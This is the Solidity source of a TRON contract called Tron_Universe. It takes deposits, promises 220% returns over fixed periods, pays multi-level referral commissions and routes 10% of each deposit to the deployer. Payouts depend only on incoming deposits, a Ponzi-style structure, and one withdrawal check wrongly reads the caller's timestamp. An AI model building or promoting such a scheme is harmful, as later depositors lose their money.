//SourceUnit: Tron_Universe.sol

pragma solidity ^0.4.25;


/* ---> (www.tronuniverse.top)  | (c) 2020 Development by TRX-ON-TOP TEAM Tron_Universe.sol <------ */

contract Tron_Universe {
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint ref_1;
    uint ref_2;
    uint ref_3;
    uint ref_4;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint depositCount;
    uint invested;
    uint paidAt;
    uint withdrawn;
    uint lastWithdraw;
  }
  
  uint MIN_DEPOSIT = 5 trx;
  
  
  address public support = msg.sender;
  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);

//----------------------FUNCIONES----------------------------------  

//-----------------Registros de Inversores-------------------------

  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      investors[msg.sender].lastWithdraw = now - 1 days;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          
          if (i == 0) {
            investors[rec].ref_1++;
          }
          if (i == 1) {
            investors[rec].ref_2++;
          }
          if (i == 2) {
            investors[rec].ref_3++;
          }
          if (i == 3) {
            investors[rec].ref_4++;
          }
          
          rec = investors[rec].referer;
        }
      }
    }
  }
  
//--------------------Referir-----------------------------------

  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      uint a = amount * refRewards[i] / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      
      rec = investors[rec].referer;
    }
  }
  
 //--------------------Creando Planes----------------------- 
  
  constructor() public {
    tariffs.push(Tariff(22 * 28800, 220));
    tariffs.push(Tariff(16 * 28800, 220));
    tariffs.push(Tariff(14 * 28800, 220));  
    tariffs.push(Tariff(12 * 28800, 220));
    tariffs.push(Tariff(9 * 28800, 220));
    
    for (uint i = 4; i >= 1; i--) {
      refRewards.push(i);
    }
    
  }
  
//---------------------Depósitos----------------------------  
  
  function deposit(address referer) external payable {
    
    require(msg.value >= MIN_DEPOSIT);
    require(investors[msg.sender].depositCount < 220);
     
    
    
    uint tariff;
    if        (msg.value < 100000000) { // 100 TRX
      tariff = 0;
    } else if (msg.value < 1000000000) { // 1 000 TRX
      tariff = 1;
    } else if (msg.value < 10000000000) { // 10 000 TRX
      tariff = 2;
    } else if (msg.value < 100000000000) { // 100 000 TRX
      tariff = 3;
    } else {
      tariff = 4;
    }
    
    register(referer);
    support.transfer(msg.value / 10);
    rewardReferers(msg.value, investors[msg.sender].referer);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
    investors[msg.sender].depositCount++;
    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
//----------------------Recopilar Información de Retiro---------------------  
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    require (now > investors[msg.sender].lastWithdraw  + 1 days);
    
    
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }
  

  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;
  }
  
//------------Ejecuta el Retiro de los Dividendos luego de 24H----------  
  
  function withdraw() external {
    uint amount = profit();
    msg.sender.transfer(amount);
    investors[msg.sender].withdrawn += amount;
    emit Withdraw(msg.sender, amount);
    investors[msg.sender].lastWithdraw = now ;
  }
  
//--------------------Informanción de Inversores------------------------  
  
  function getDeposit(address investor, uint index) external view returns (uint tariff, uint amount, uint at) {
    tariff = investors[investor].deposits[index].tariff;
    amount = investors[investor].deposits[index].amount;
    at = investors[investor].deposits[index].at;
    
  }
  
  
}